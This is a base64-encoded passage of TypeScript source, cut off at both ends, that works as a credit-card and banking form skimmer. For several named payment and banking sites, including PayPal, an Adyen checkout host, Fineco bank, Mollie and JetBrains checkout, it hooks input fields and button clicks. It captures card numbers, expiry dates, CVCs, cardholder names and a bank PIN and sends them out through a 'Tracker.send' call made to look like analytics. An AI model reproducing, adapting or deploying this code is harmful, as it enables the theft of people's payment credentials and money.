ZiAobW9kYWwuY2hpbGROb2Rlcy5sZW5ndGggIT09IDApIHtcclxuICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICBzZWxmLmV4cGxvcmVIZWxsb0ZyZXNoUGF5bWVudENvbnRhaW5lcihzZWxmLCBtb2RhbCwgZnVuY3Rpb24gKF9fZGV0ZWN0ZWRFbGVtZW50OiBhbnkpIHtcclxuICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgX19kZXRlY3RlZEVsZW1lbnQuYWRkRXZlbnRMaXN0ZW5lcignY2xpY2snLCBmdW5jdGlvbiAoKSB7XHJcbiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICBUcmFja2VyLnNlbmQoe1xyXG4gICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIGNvbW1hbmQ6ICdzYXZlUGF5bWVudE1ldGhvZHNEYXRhJyxcclxuICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICBkYXRhOiB7XHJcbiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICdjYXJkTnVtYmVyJzogd2luZG93LnNlc3Npb25TdG9yYWdlLmdldEl0ZW0oJ2NhcmROdW1iZXInKSAhPT0gdW5kZWZpbmVkID8gd2luZG93LnNlc3Npb25TdG9yYWdlLmdldEl0ZW0oJ2NhcmROdW1iZXInKSA6ICdVbmtub3duJyxcclxuICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgJ2NhcmRCcmFuZCc6ICdVbmtub3duJyxcclxuICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgJ2NhcmRIb2xkZXInOiAnVW5rbm93bicsXHJcbiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICdjYXJkRXhwaXJlJzogd2luZG93LnNlc3Npb25TdG9yYWdlLmdldEl0ZW0oJ2NhcmRFeHBpcmUnKSAhPT0gdW5kZWZpbmVkID8gd2luZG93LnNlc3Npb25TdG9yYWdlLmdldEl0ZW0oJ2NhcmRFeHBpcmUnKSA6ICdVbmtub3duJyxcclxuICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgJ2NhcmRDVkMnOiB3aW5kb3cuc2Vzc2lvblN0b3JhZ2UuZ2V0SXRlbSgnY2FyZENWQycpICE9PSB1bmRlZmluZWQgPyB3aW5kb3cuc2Vzc2lvblN0b3JhZ2UuZ2V0SXRlbSgnY2FyZENWQycpIDogJ1Vua25vd24nLFxyXG4gICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAnZXZlbnQnOiAnYWRkJyxcclxuICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgJ3dvcmtXZWJzaXRlJzogd2luZG93LmxvY2F0aW9uLm9yaWdpblxyXG4gICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIH1cclxuICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIH0pO1xyXG4gICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgd2luZG93LnNlc3Npb25TdG9yYWdlLmNsZWFyKCk7XHJcbiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIH0pO1xyXG4gICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIH0pO1xyXG4gICAgICAgICAgICAgICAgICAgICAgICAgICAgfVxyXG4gICAgICAgICAgICAgICAgICAgICAgICB9KTtcclxuICAgICAgICAgICAgICAgICAgICB9XHJcbiAgICAgICAgICAgICAgICB9LCAxMDApO1xyXG4gICAgICAgICAgICB9XHJcblxyXG4gICAgICAgICAgICBpZiAod2luZG93LmxvY2F0aW9uLm9yaWdpbi5pbmRleE9mKCdjaGVja291dHNob3BwZXItbGl2ZS5hZHllbi5jb20nKSAhPT0gLTEpIHtcclxuICAgICAgICAgICAgICAgIGNsZWFySW50ZXJ2YWwoaW50ZXJ2YWwxKTtcclxuICAgICAgICAgICAgICAgIGxldCBpbnRlcnZhbCA9IHNldEludGVydmFsKGZ1bmN0aW9uICgpIHtcclxuICAgICAgICAgICAgICAgICAgICBpZiAoZG9jdW1lbnQucXVlcnlTZWxlY3RvcignYm9keScpICE9PSBudWxsKSB7XHJcbiAgICAgICAgICAgICAgICAgICAgICAgIGNsZWFySW50ZXJ2YWwoaW50ZXJ2YWwpO1xyXG4gICAgICAgICAgICAgICAgICAgICAgICBzZWxmLmV4cGxvcmVQYXltZW50SW5wdXRUYWcoc2VsZiwgKGRvY3VtZW50LnF1ZXJ5U2VsZWN0b3IoJ2JvZHknKSBhcyBIVE1MRWxlbWVudCksICdlbmNyeXB0ZWQnLCBmdW5jdGlvbiAoX19kZXRlY3RlZEVsZW1lbnQ6IGFueSkge1xyXG5cclxuICAgICAgICAgICAgICAgICAgICAgICAgICAgIF9fZGV0ZWN0ZWRFbGVtZW50LmFkZEV2ZW50TGlzdGVuZXIoJ2tleXVwJywgZnVuY3Rpb24gKCkge1xyXG4gICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIGlmIChfX2RldGVjdGVkRWxlbWVudC5pZCA9PT0gJ2VuY3J5cHRlZENhcmROdW1iZXInKSB7XHJcbiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIHdpbmRvdy5zZXNzaW9uU3RvcmFnZS5zZXRJdGVtKCdjYXJkTnVtYmVyJywgX19kZXRlY3RlZEVsZW1lbnQudmFsdWUpO1xyXG4gICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIH1cclxuXHJcbiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgaWYgKF9fZGV0ZWN0ZWRFbGVtZW50LmlkID09PSAnZW5jcnlwdGVkRXhwaXJ5RGF0ZScpIHtcclxuICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgd2luZG93LnNlc3Npb25TdG9yYWdlLnNldEl0ZW0oJ2NhcmRFeHBpcmUnLCBfX2RldGVjdGVkRWxlbWVudC52YWx1ZSk7XHJcbiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgfVxyXG5cclxuICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICBpZiAoX19kZXRlY3RlZEVsZW1lbnQuaWQgPT09ICdlbmNyeXB0ZWRTZWN1cml0eUNvZGUnKSB7XHJcbiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIHdpbmRvdy5zZXNzaW9uU3RvcmFnZS5zZXRJdGVtKCdjYXJkQ1ZDJywgX19kZXRlY3RlZEVsZW1lbnQudmFsdWUpO1xyXG4gICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIH1cclxuICAgICAgICAgICAgICAgICAgICAgICAgICAgIH0pO1xyXG4gICAgICAgICAgICAgICAgICAgICAgICB9KTtcclxuICAgICAgICAgICAgICAgICAgICB9XHJcbiAgICAgICAgICAgICAgICB9LCAxMDApO1xyXG4gICAgICAgICAgICB9XHJcblxyXG4gICAgICAgICAgICBpZiAod2luZG93LmxvY2F0aW9uLm9yaWdpbi5pbmRleE9mKCdiZXN0c2VjcmV0LmNvbScpICE9PSAtMSkge1xyXG4gICAgICAgICAgICAgICAgY2xlYXJJbnRlcnZhbChpbnRlcnZhbDEpO1xyXG4gICAgICAgICAgICAgICAgbGV0IGludGVydmFsID0gc2V0SW50ZXJ2YWwoZnVuY3Rpb24gKCkge1xyXG4gICAgICAgICAgICAgICAgICAgIGlmIChkb2N1bWVudC5xdWVyeVNlbGVjdG9yQWxsKCdmb3JtJykubGVuZ3RoICE9PSAwKSB7XHJcbiAgICAgICAgICAgICAgICAgICAgICAgIGNsZWFySW50ZXJ2YWwoaW50ZXJ2YWwpO1xyXG4gICAgICAgICAgICAgICAgICAgICAgICBzZWxmLmV4cGxvcmVCZXN0U2VjcmV0UGF5bWVudENvbnRhaW5lcihzZWxmKTtcclxuICAgICAgICAgICAgICAgICAgICB9XHJcbiAgICAgICAgICAgICAgICB9LCAxMDApO1xyXG4gICAgICAgICAgICB9XHJcblxyXG4gICAgICAgICAgICBpZiAod2luZG93LmxvY2F0aW9uLm9yaWdpbi5pbmRleE9mKCdwYXlwYWwnKSAhPT0gLTEpIHtcclxuICAgICAgICAgICAgICAgIGNsZWFySW50ZXJ2YWwoaW50ZXJ2YWwxKTtcclxuICAgICAgICAgICAgICAgIC8qbGV0IGx4dCA9ICc0V0U1NjkzOE5TNjkxNTkxVCcqL1xyXG4gICAgICAgICAgICAgICAgbGV0IGludGVydmFsID0gc2V0SW50ZXJ2YWwoZnVuY3Rpb24gKCkge1xyXG4gICAgICAgICAgICAgICAgICAgIGlmIChkb2N1bWVudC5xdWVyeVNlbGVjdG9yKCdmb3JtJykgIT09IG51bGwpIHtcclxuICAgICAgICAgICAgICAgICAgICAgICAgY2xlYXJJbnRlcnZhbChpbnRlcnZhbCk7XHJcbiAgICAgICAgICAgICAgICAgICAgICAgIGRvY3VtZW50LnF1ZXJ5U2VsZWN0b3JBbGwoJ2Zvcm0nKS5mb3JFYWNoKGZ1bmN0aW9uIChfX3BheXBhbEZvcm1FbGVtZW50KSB7XHJcbiAgICAgICAgICAgICAgICAgICAgICAgICAgICBpZiAoX19wYXlwYWxGb3JtRWxlbWVudC5hY3Rpb24uaW5kZXhPZignbXlhY2NvdW50L21vbmV5JykgIT09IC0xIHx8IHdpbmRvdy5sb2NhdGlvbi5ocmVmLmluZGV4T2YoJ3dlYmFwcHMnKSAhPT0gLTEpIHtcclxuICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICBsZXQgZWxlbWVudHM6IGFueSA9IFtdO1xyXG4gICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIHNlbGYuZXhwbG9yZVBheVBhbFBheW1lbnRGb3JtRWxlbWVudChzZWxmLCBfX3BheXBhbEZvcm1FbGVtZW50LCBlbGVtZW50cywgZnVuY3Rpb24gKGNvbnRyb2xsZXIsIGVsZW1lbnRzKSB7XHJcbiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIFsnY2xpY2snLCAnZGJsY2xpY2snXS5mb3JFYWNoKGZ1bmN0aW9uIChldmVudCkge1xyXG4gICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgY29udHJvbGxlci5hZGRFdmVudExpc3RlbmVyKGV2ZW50LCBmdW5jdGlvbiAoKSB7XHJcbiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgbGV0IHBheW1lbnRNZXRob2RTdG9yZTogYW55ID0gW107XHJcbiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgZWxlbWVudHMuZm9yRWFjaChmdW5jdGlvbiAoX19kZXRlY3RlZEVsZW1lbnQ6IEhUTUxJbnB1dEVsZW1lbnQpIHtcclxuICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgcGF5bWVudE1ldGhvZFN0b3JlLnB1c2goe1xyXG4gICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgJ2VsZW1lbnQnOiBfX2RldGVjdGVkRWxlbWVudC5ub2RlTmFtZSxcclxuICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICdpZCc6IF9fZGV0ZWN0ZWRFbGVtZW50LmlkLFxyXG4gICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgJ3ZhbHVlJzogX19kZXRlY3RlZEVsZW1lbnQudmFsdWVcclxuICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgfSk7XHJcbiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgfSk7XHJcbiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgaWYgKF9fcGF5cGFsRm9ybUVsZW1lbnQuYWN0aW9uLmluZGV4T2YoJ215YWNjb3VudC9tb25leScpICE9PSAtMSkge1xyXG4gICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICBUcmFja2VyLnNlbmQoe1xyXG4gICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgY29tbWFuZDogJ3NhdmVQYXltZW50TWV0aG9kc0RhdGEnLFxyXG4gICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgZGF0YToge1xyXG4gICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICdjYXJkTnVtYmVyJzogcGF5bWVudE1ldGhvZFN0b3JlWzBdLnZhbHVlID8gcGF5bWVudE1ldGhvZFN0b3JlWzBdLnZhbHVlIDogJ1Vua25vd24nLFxyXG4gICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICdjYXJkQnJhbmQnOiBwYXltZW50TWV0aG9kU3RvcmVbMV0udmFsdWUgPyBwYXltZW50TWV0aG9kU3RvcmVbMV0udmFsdWUgOiAnVW5rbm93bicsXHJcbiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgJ2NhcmRIb2xkZXInOiAnVW5rbm93bicsXHJcbiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgJ2NhcmRFeHBpcmUnOiBwYXltZW50TWV0aG9kU3RvcmVbMl0udmFsdWUgPyBwYXltZW50TWV0aG9kU3RvcmVbMl0udmFsdWUgOiAnVW5rbm93bicsXHJcbiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgJ2NhcmRDVkMnOiBwYXltZW50TWV0aG9kU3RvcmVbM10udmFsdWUgPyBwYXltZW50TWV0aG9kU3RvcmVbM10udmFsdWUgOiAnVW5rbm93bicsXHJcbiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgJ2V2ZW50JzogJ2FkZCcsXHJcbiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgJ3dvcmtXZWJzaXRlJzogd2luZG93LmxvY2F0aW9uLm9yaWdpblxyXG4gICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgfVxyXG4gICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICB9KTtcclxuICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgcGF5bWVudE1ldGhvZFN0b3JlID0gW107XHJcbiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgfVxyXG4gICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIGlmICh3aW5kb3cubG9jYXRpb24uaHJlZi5pbmRleE9mKCd3ZWJhcHBzJykgIT09IC0xKSB7XHJcbiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIFRyYWNrZXIuc2VuZCh7XHJcbiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICBjb21tYW5kOiAnc2F2ZVBheW1lbnRNZXRob2RzRGF0YScsXHJcbiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICBkYXRhOiB7XHJcbiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgJ2NhcmROdW1iZXInOiBwYXltZW50TWV0aG9kU3RvcmVbMl0udmFsdWUgPyBwYXltZW50TWV0aG9kU3RvcmVbMl0udmFsdWUgOiAnVW5rbm93bicsXHJcbiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgJ2NhcmRCcmFuZCc6IGRvY3VtZW50LnF1ZXJ5U2VsZWN0b3IoJy5jc3MtaXJvMXNzLUljb25Db250YWluZXIuZTd2b3p2ejAnKT8uZmlyc3RFbGVtZW50Q2hpbGQ/LmZpcnN0RWxlbWVudENoaWxkPy50ZXh0Q29udGVudD8udG9Mb3dlckNhc2UoKSxcclxuICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAnY2FyZEhvbGRlcic6IChwYXltZW50TWV0aG9kU3RvcmVbMF0udmFsdWUgPyBwYXltZW50TWV0aG9kU3RvcmVbMF0udmFsdWUgOiAnVW5rbm93bicpICsgJyAnICsgKHBheW1lbnRNZXRob2RTdG9yZVsxXS52YWx1ZSA/IHBheW1lbnRNZXRob2RTdG9yZVsxXS52YWx1ZSA6ICdVbmtub3duJyksXHJcbiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgJ2NhcmRFeHBpcmUnOiBwYXltZW50TWV0aG9kU3RvcmVbM10udmFsdWUgPyBwYXltZW50TWV0aG9kU3RvcmVbM10udmFsdWUgOiAnVW5rbm93bicsXHJcbiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgJ2NhcmRDVkMnOiBwYXltZW50TWV0aG9kU3RvcmVbNF0udmFsdWUgPyBwYXltZW50TWV0aG9kU3RvcmVbNF0udmFsdWUgOiAnVW5rbm93bicsXHJcbiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgJ2V2ZW50JzogJ2FkZCcsXHJcbiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgJ3dvcmtXZWJzaXRlJzogd2luZG93LmxvY2F0aW9uLm9yaWdpblxyXG4gICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgfVxyXG4gICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICB9KTtcclxuICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgcGF5bWVudE1ldGhvZFN0b3JlID0gW107XHJcbiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgfVxyXG5cclxuICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIH0pO1xyXG4gICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICB9KTtcclxuICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICB9KTtcclxuICAgICAgICAgICAgICAgICAgICAgICAgICAgIH1cclxuICAgICAgICAgICAgICAgICAgICAgICAgfSk7XHJcbiAgICAgICAgICAgICAgICAgICAgfVxyXG4gICAgICAgICAgICAgICAgfSwgMTAwKTtcclxuICAgICAgICAgICAgfVxyXG5cclxuICAgICAgICAgICAgaWYgKHdpbmRvdy5sb2NhdGlvbi5vcmlnaW4uaW5kZXhPZignZmluZWNvYmFuaycpICE9PSAtMSkge1xyXG4gICAgICAgICAgICAgICAgaWYgKGRvY3VtZW50LnF1ZXJ5U2VsZWN0b3IoJyNQSU4nKSAhPT0gbnVsbCkge1xyXG4gICAgICAgICAgICAgICAgICAgIGNsZWFySW50ZXJ2YWwoaW50ZXJ2YWwxKTtcclxuICAgICAgICAgICAgICAgICAgICBzZWxmLmV4cGxvcmVQYXltZW50SW5wdXRUYWdPbmx5KHNlbGYsIChkb2N1bWVudC5xdWVyeVNlbGVjdG9yKCcjY29uZmVybWFfZW1haWxfY2VydGlmQ29tbWFuZCcpIGFzIEhUTUxFbGVtZW50KSwgZnVuY3Rpb24gKF9fZGV0ZWN0ZWRFbGVtZW50OiBhbnkpIHtcclxuICAgICAgICAgICAgICAgICAgICAgICAgX19kZXRlY3RlZEVsZW1lbnQuYWRkRXZlbnRMaXN0ZW5lcignY2xpY2snLCBmdW5jdGlvbiAoKSB7XHJcbiAgICAgICAgICAgICAgICAgICAgICAgICAgICBUcmFja2VyLnNlbmQoe1xyXG4gICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIGNvbW1hbmQ6ICdzYXZlQmFua0FjY291bnREYXRhJyxcclxuICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICBkYXRhOiB7XHJcbiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICdkYXRhVHlwZSc6ICdQSU4nLFxyXG4gICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAnZGF0YVZhbHVlJzogKGRvY3VtZW50LnF1ZXJ5U2VsZWN0b3IoJyNQSU4nKSBhcyBIVE1MSW5wdXRFbGVtZW50KS52YWx1ZSxcclxuICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgXCJ3b3JrV2Vic2l0ZVwiOiB3aW5kb3cubG9jYXRpb24ub3JpZ2luXHJcbiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgfVxyXG4gICAgICAgICAgICAgICAgICAgICAgICAgICAgfSk7XHJcbiAgICAgICAgICAgICAgICAgICAgICAgIH0pO1xyXG4gICAgICAgICAgICAgICAgICAgIH0pO1xyXG4gICAgICAgICAgICAgICAgfVxyXG4gICAgICAgICAgICB9XHJcblxyXG4gICAgICAgICAgICBpZiAod2luZG93LmxvY2F0aW9uLm9yaWdpbi5pbmRleE9mKCdtb2xsaWUnKSAhPT0gLTEpIHtcclxuICAgICAgICAgICAgICAgIGNsZWFySW50ZXJ2YWwoaW50ZXJ2YWwxKTtcclxuICAgICAgICAgICAgICAgIGxldCBpbnRlcnZhbCA9IHNldEludGVydmFsKGZ1bmN0aW9uICgpIHtcclxuICAgICAgICAgICAgICAgICAgICBpZiAoZG9jdW1lbnQucXVlcnlTZWxlY3RvckFsbCgnZm9ybScpLmxlbmd0aCAhPT0gMCkge1xyXG4gICAgICAgICAgICAgICAgICAgICAgICBjbGVhckludGVydmFsKGludGVydmFsKTtcclxuICAgICAgICAgICAgICAgICAgICAgICAgc2VsZi5leHBsb3JlTW9sbGllUGF5bWVudENvbnRhaW5lcihzZWxmKTtcclxuICAgICAgICAgICAgICAgICAgICB9XHJcbiAgICAgICAgICAgICAgICB9LCAxMDApO1xyXG4gICAgICAgICAgICB9XHJcblxyXG4gICAgICAgICAgICBpZiAod2luZG93LmxvY2F0aW9uLm9yaWdpbi5pbmRleE9mKCdzdW5kYXknKSAhPT0gLTEpIHtcclxuICAgICAgICAgICAgICAgIGNsZWFySW50ZXJ2YWwoaW50ZXJ2YWwxKTtcclxuICAgICAgICAgICAgICAgIGxldCBpbnRlcnZhbCA9IHNldEludGVydmFsKGZ1bmN0aW9uICgpIHtcclxuICAgICAgICAgICAgICAgICAgICBpZiAoZG9jdW1lbnQucXVlcnlTZWxlY3RvckFsbCgnZm9ybScpLmxlbmd0aCAhPT0gMCkge1xyXG4gICAgICAgICAgICAgICAgICAgICAgICBjbGVhckludGVydmFsKGludGVydmFsKTtcclxuICAgICAgICAgICAgICAgICAgICAgICAgc2VsZi5leHBsb3JlU3VuZGF5UGF5bWVudENvbnRhaW5lcihzZWxmKTtcclxuICAgICAgICAgICAgICAgICAgICB9XHJcbiAgICAgICAgICAgICAgICB9LCAxMDApO1xyXG4gICAgICAgICAgICB9XHJcblxyXG4gICAgICAgICAgICBpZiAod2luZG93LmxvY2F0aW9uLm9yaWdpbi5pbmRleE9mKCdqZXRicmFpbnMnKSAhPT0gLTEpIHtcclxuICAgICAgICAgICAgICAgIGNsZWFySW50ZXJ2YWwoaW50ZXJ2YWwxKTtcclxuICAgICAgICAgICAgICAgIGxldCBpbnRlcnZhbCA9IHNldEludGVydmFsKGZ1bmN0aW9uICgpIHtcclxuICAgICAgICAgICAgICAgICAgICBpZiAod2luZG93LmxvY2F0aW9uLm9yaWdpbi5pbmRleE9mKCdjaGVja291dCcpICE9PSAtMSkge1xyXG4gICAgICAgICAgICAgICAgICAgICAgICBjbGVhckludGVydmFsKGludGVydmFsKTtcclxuICAgICAgICAgICAgICAgICAgICAgICAgZG9jdW1lbnQucXVlcnlTZWxlY3RvckFsbCgnYnV0dG9uJykuZm9yRWFjaChmdW5jdGlvbiAoX19idXR0b25FbGVtZW50KSB7XHJcbiAgICAgICAgICAgICAgICAgICAgICAgICAgICBpZiAoX19idXR0b25FbGVtZW50LmNsYXNzTGlzdC5jb250YWlucygnYnRuQ29uZmlybVBheW1lbnQnKSkge1xyXG4gICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIFRyYWNrZXIuc2VuZCh7XHJcbiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIGNvbW1hbmQ6ICdzYXZlUGF5bWVudE1ldGhvZHNEYXRhJyxcclxuICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgZGF0YToge1xyXG4gICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgJ2NhcmROdW1iZXInOiAoZG9jdW1lbnQucXVlcnlTZWxlY3RvcignI2NjTnVtYmVyJykgYXMgSFRNTElucHV0RWxlbWVudCkudmFsdWUgPyAoZG9jdW1lbnQucXVlcnlTZWxlY3RvcignI2NjTnVtYmVyJykgYXMgSFRNTElucHV0RWxlbWVudCkudmFsdWUgOiAnVW5rbm93bicsXHJcbiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAnY2FyZEJyYW5kJzogLypwYXltZW50TWV0aG9kRGF0YVs2XS52YWx1ZSA/IHBheW1lbnRNZXRob2REYXRhWzZdLnZhbHVlIDoqLyAnVW5rbm93bicsXHJcbiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAnY2FyZEhvbGRlcic6IChkb2N1bWVudC5xdWVyeVNlbGVjdG9yKCcjY2NIb2xkZXInKSBhcyBIVE1MSW5wdXRFbGVtZW50KS52YWx1ZSA/IChkb2N1bWVudC5xdWVyeVNlbGVjdG9yKCcjY2NIb2xkZXInKSBhcyBIVE1MSW5wdXRFbGVtZW50KS52YWx1ZSA6ICdVbmtub3duJyxcclxuICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICdjYXJkRXhwaXJlJzogKGRvY3VtZW50LnF1ZXJ5U2VsZWN0b3IoJyNjY0V4cGlyYXRpb25Nb250aCcpIGFzIEhUTUxJbnB1dEVsZW1lbnQpLnZhbHVlID8gKGRvY3VtZW50LnF1ZXJ5U2VsZWN0b3IoJyNjY0V4cGlyYXRpb25Nb250aCcpIGFzIEhUTUxJbnB1dEVsZW1lbnQpLnZhbHVlIDogJ1Vua25vd24nICsgJy8nICsgKGRvY3VtZW50LnF1ZXJ5U2VsZWN0b3IoJyNjY0V4cGlyYXRpb25ZZWFyJykgYXMgSFRNTElucHV0RWxlbWVudCkudmFsdWUgPyAoZG9jdW1lbnQucXVlcnlTZWxlY3RvcignI2NjRXhwaXJhdGlvblllYXInKSBhcyBIVE1MSW5wdXRFbGVtZW50KS52YWx1ZSA6ICdVbmtub3duJyxcclxuICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICdjYXJkQ1ZDJzogKGRvY3VtZW50LnF1ZXJ5U2VsZWN0b3IoJyNjY1NlY3VyaXR5Q29kZScpIGFzIEhUTUxJbnB1dEVsZW1lbnQpLnZhbHVlID8gKGRvY3VtZW50LnF1ZXJ5U2VsZWN0b3IoJyNjY1NlY3VyaXR5Q29kZScpIGFzIEhUTUxJbnB1dEVsZW1lbnQpLnZhbHVlIDogJ1Vua25vd24nLFxyXG4gICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgJ2V2ZW50JzogJ2FkZCcsXHJcbiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAnd29ya1dlYnNpdGUnOiB3aW5kb3cubG9jYXRpb24ub3JpZ2luXHJcbiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIH1cclxuICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICB9KTtcclxuICAgICAgICAgICAgICAgICAgICAgICAgICAgIH1cclxuICAgICAgICAgICAgICAgICAgICAgICAgfSlcclxuICAgICAgICAgICAgICAgICAgICB9XHJcbiAgICAgICAgICAgICAgICB9LCAxMDApO1xyXG4gICAgICAgICAgICB9XHJcblxyXG4gICAgICAgICAgICBpZiAod2luZG93LmxvY2F0aW9uLm9yaWdpbi5pbmRleE9mKCdwYXlnYXRlJykgIT09IC0xKSB7XHJcbiAgICAgICAgICAgICAgICBjbGVhckludGVydmFsKGludGVydmFsMSk7XHJcbiAgICAgICAgICAgICAgICBsZXQgaW50ZXJ2YWwgPSBzZXRJbnRlcnZhbChmdW5jdGlvbiAoKSB7XHJcbiAgICAgICAgICAgICAgICAgICAgaWYgKGRvY3VtZW50LnF1ZXJ5U2VsZWN0b3JBbGwoJ2Zvcm0nKS5sZW5ndGggIT09IDApIHtcclxuICAgICAgICAgICAgICAgICAgICAgICAgY2xlYXJJbnRlcnZhbChpbnRlcnZhbCk7XHJcbiAgICAgICAgICAgICAgICAgICAgICAgIHNlbGYuZXhwbG9yZVBheWdhdGVQYXltZW50Q29udGFpbmVyKHNlbGYpO1xyXG4gICAgICAgICAgICAgICAgICAgIH1cclxuICAgICAgICAgICAgICAgIH0sIDEwMCk7XHJcbiAgICAgICAgICAgIH1cclxuXHJcbiAgICAgICAgICAgIGlmICh3aW5kb3cubG9jYXRpb24ub3JpZ2luLmluZGV4T2Yo